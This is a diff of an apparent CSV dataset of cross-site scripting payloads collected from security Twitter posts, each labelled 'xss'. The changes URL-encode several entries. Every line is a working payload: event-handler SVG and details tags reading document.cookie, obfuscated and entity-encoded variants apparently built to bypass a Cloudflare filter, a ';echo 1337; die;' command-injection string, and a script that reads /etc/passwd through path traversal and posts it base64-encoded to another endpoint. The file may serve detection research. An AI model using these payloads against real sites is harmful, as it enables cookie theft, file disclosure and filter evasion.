@@ -502,11 +502,11 @@ https://twitter.com/PrinceOker79109/status/1786548416010498123, %3CImg%20Src%3DO
 https://twitter.com/XssPayloads/status/1788748656390058340, %26lt%3Bfoo%2520bar%3D%25250a%2520onclick%3D%26lt%3Byour%20js%20code%26gt,xss
 https://twitter.com/Dharamveer_____/status/1788492033675440375, %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E,xss
 https://twitter.com/Dharamveer_____/status/1788492033675440375,%20%60%22%2F%2F%3E%3Cscript%3Ealert%28%29%3C%2Fscript%3E,xss
-https://twitter.com/its_Loksh_P/status/1792006779783848407, alert = window["al"+"ert"],xss
-https://twitter.com/Sharo_k_h/status/1792235995154514276, <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>,xss
-https://twitter.com/0xRAYAN7/status/1793217107544424474, <svg onload=alert&#0000000040document.cookie> <svg/oNLY=1/**/On+ONLoaD=co\u006efirm&\#x28;\#x29;> <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ=="))>,xss
-https://twitter.com/0xRAYAN7/status/1793217107544424474, &lt;svg/oNLY%3d1/**/On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b&gt;,xss
-https://twitter.com/0xRAYAN7/status/1793217107544424474, &lt;Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ=="))&gt;,xss
+https://twitter.com/its_Loksh_P/status/1792006779783848407, alert%20%3D%20window%5B%22al%22%2B%22ert%22%5D,xss
+https://twitter.com/Sharo_k_h/status/1792235995154514276,%20%3Cdetails%20x%3Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%3A2%20open%20ontoggle%3D%26%23x0000000000061%3Blert%26%23x000000028%3Borigin%26%23x000029%3B%3E,xss
+https://twitter.com/0xRAYAN7/status/1793217107544424474,%20%3Csvg%20onload%3Dalert%26%230000000040document.cookie%3E%20%3Csvg%2FoNLY%3D1%2F%2A%2A%2FOn%2BONLoaD%3Dco%5Cu006efirm%26%5C%23x28%3B%5C%23x29%3B%3E,xss
+https://twitter.com/0xRAYAN7/status/1793217107544424474,%20%26lt%3Bsvg%2FoNLY%253d1%2F%2A%2A%2FOn%2BONLoaD%253dco%5Cu006efirm%2526%2523x28%253b%2526%2523x29%253b%26gt%3B,xss
+https://twitter.com/0xRAYAN7/status/1793217107544424474,%20%26lt%3BSvg%20Only%3D1%20OnLoad%3Dconfirm%28atob%28%22Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ%3D%3D%22%29%29%26gt%3B,xss
 https://vulners.com/githubexploit/C99986A2-7B57-5939-9BD1-AA95A6572AF3?utm_source=rss&utm_medium=rss&utm_campaign=rss, ;echo 1337; die;,xss
 https://twitter.com/t0t3kingpad4/status/1800833416491049416, "/&gt;&lt;​/script&gt;&lt;​script&gt;alert(document.domain)&lt;​/script&gt;,xss
 https://twitter.com/cyber_advising/status/1804119011086549017, <script>fetch('/json_api.php?query[]=../etc/passwd').then(r => r.text()).then(t => fetch('/json_api.php?query[]=../rspamd_custom_maps/'+btoa(t)))</script>,xss
